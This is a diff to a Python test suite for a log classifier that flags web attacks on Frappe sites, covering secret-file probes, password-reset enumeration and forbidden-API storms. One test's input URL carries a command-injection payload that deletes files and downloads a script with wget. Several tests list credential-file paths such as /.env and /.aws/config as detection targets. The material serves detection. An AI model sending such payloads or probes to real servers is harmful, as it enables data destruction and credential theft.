@@ -162,8 +162,14 @@ class TestNewProbes(unittest.TestCase):
 
 	def test_frappe_paths_and_files_are_not_probes(self):
 		for target in ("/assets/frappe/css/fonts/fontawesome/svgs/brands/joomla.svg", "/files/citrix/notes.pdf",
-		               "/api/v2/document/User/a@b.c", "/app/sales-invoice/new", "/api/method/frappe.client.get_list"):  # fmt: skip
+		               "/api/v2/document/User/a@b.c", "/app/sales-invoice/new", "/api/method/frappe.client.get_list",
+		               # a DocType, a web page or a query string may name an appliance
+		               "/app/jenkins/JOB-0001", "/blog/jenkins/ci-setup", "/help/geoserver/install", "/kb/web.config",
+		               "/docs/debug/pprof", "/login?redirect-to=/app/citrix/", "/callback?return=https://ci/jenkins/job/x"):  # fmt: skip
 			self.assertEqual(web_attacks.classify("GET", target, 200), [], target)
+		for target in ("/web.config/", "/.env/", "/docker-compose.prod.yml", "/compose.yaml", "/config/secrets.json", "/.aws/config"):
+			self.assertTrue(web_attacks.classify("GET", target), target)
+		self.assertIn("command_injection", web_attacks.classify("GET", "/shell?cd+/tmp;rm+-rf+*;wget+http://x/a.sh"))
 
 	def test_frappe_rules(self):
 		reset = "/api/method/frappe.core.doctype.user.user.reset_password"
@@ -171,7 +177,10 @@ class TestNewProbes(unittest.TestCase):
 		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.integrations.oauth2.get_token", 401), ["frappe_auth_abuse"])
 		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.client.insert", 403), ["frappe_api_forbidden"])
 		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.client.insert", 200), [])
-		self.assertEqual(web_attacks.classify("GET", "/api/resource/User", 401), ["frappe_api_forbidden"])
+		self.assertEqual(web_attacks.classify("GET", "/api/resource/User", 403), ["frappe_api_forbidden"])
+		self.assertEqual(web_attacks.classify("GET", "/api/resource/User", 401), [], "401 is also an expired session")
+		self.assertEqual(web_attacks.classify("POST", "/api/v2/method/frappe.core.doctype.user.user.reset_password"),
+		                 ["frappe_auth_abuse"])  # fmt: skip
 
 
 class TestFrappeRates(unittest.TestCase):
@@ -193,8 +202,8 @@ class TestFrappeRates(unittest.TestCase):
 		p = self.parser()
 		for i in range(12):  # enumerating accounts through the password reset
 			p.feed(line(f"/api/method/frappe.core.doctype.user.user.reset_password?user=u{i}@example.com", status=200))
-		for _ in range(25):  # trying methods without the right to
-			p.feed(line("/api/method/frappe.client.get_list?doctype=User", status=403, addr="203.0.113.9"))
+		for i in range(25):  # trying methods without the right to
+			p.feed(line(f"/api/method/frappe.client.method_{i % 6}?doctype=User", status=403, addr="203.0.113.9"))
 		got = {e["payload"]["ip"]: e["payload"]["rules"] for e in self.probes(p)}
 		self.assertEqual(got, {"198.51.100.7": {"frappe_auth_abuse": 12}, "203.0.113.9": {"frappe_api_forbidden": 25}})
 		(ev,) = [e for e in self.parser_events_with_techniques()]
@@ -206,12 +215,43 @@ class TestFrappeRates(unittest.TestCase):
 			p.feed(line(f"/api/method/frappe.integrations.oauth2.get_token?n={i}", status=401))
 		return [e["payload"]["attack_techniques"] for e in self.probes(p)]
 
-	def test_with_another_probe_it_counts_at_once(self):
+	def test_next_to_other_probes_it_joins_them(self):
 		p = self.parser()
-		p.feed(line("/api/method/frappe.core.doctype.user.user.reset_password", status=200))
 		p.feed(line("/.env"))
+		p.feed(line("/api/method/frappe.core.doctype.user.user.reset_password", status=200))
 		(ev,) = self.probes(p)
-		self.assertEqual(ev["payload"]["rules"], {"frappe_auth_abuse": 1, "env_file": 1})
+		self.assertEqual(ev["payload"]["rules"], {"env_file": 1, "frappe_auth_abuse": 1})
+
+	def test_thresholds(self):
+		for calls, expected in ((9, 0), (10, 1)):
+			p = self.parser()
+			for i in range(calls):
+				p.feed(line(f"/api/v2/method/frappe.core.doctype.user.user.reset_password?u={i}", status=200))
+			self.assertEqual(len(self.probes(p)), expected, calls)
+		for calls, methods, expected in ((19, 6, 0), (20, 6, 1), (40, 1, 0)):  # one polled resource is not a storm
+			p = self.parser()
+			for i in range(calls):
+				p.feed(line(f"/api/method/m{i % methods}", status=403))
+			self.assertEqual(len(self.probes(p)), expected, (calls, methods))
+
+	def test_a_burst_across_two_minutes(self):
+		p = self.parser()
+		reset = "/api/method/frappe.core.doctype.user.user.reset_password"
+		for i in range(6):
+			p.feed(line(f"{reset}?u={i}", status=200).replace("03:00:13", "03:00:50"))
+		self.assertEqual(self.probes(p), [], "6 so far")
+		for i in range(6):
+			p.feed(line(f"{reset}?u=b{i}", status=200).replace("03:00:13", "03:01:05"))
+		(ev,) = self.probes(p)
+		self.assertEqual(ev["payload"]["rules"], {"frappe_auth_abuse": 12}, "the window spans the minute boundary")
+
+	def test_session_expiry_and_refresh_tokens_are_not_abuse(self):
+		p = self.parser()
+		for i in range(30):  # a deploy flushed the sessions of an office behind one NAT
+			p.feed(line(f"/api/method/frappe.desk.method_{i % 8}", status=401))
+		for _ in range(15):
+			p.feed(line("/api/method/frappe.integrations.oauth2.get_token?grant_type=refresh_token", status=200))
+		self.assertEqual(self.probes(p), [])
 
 if __name__ == "__main__":
 	unittest.main()
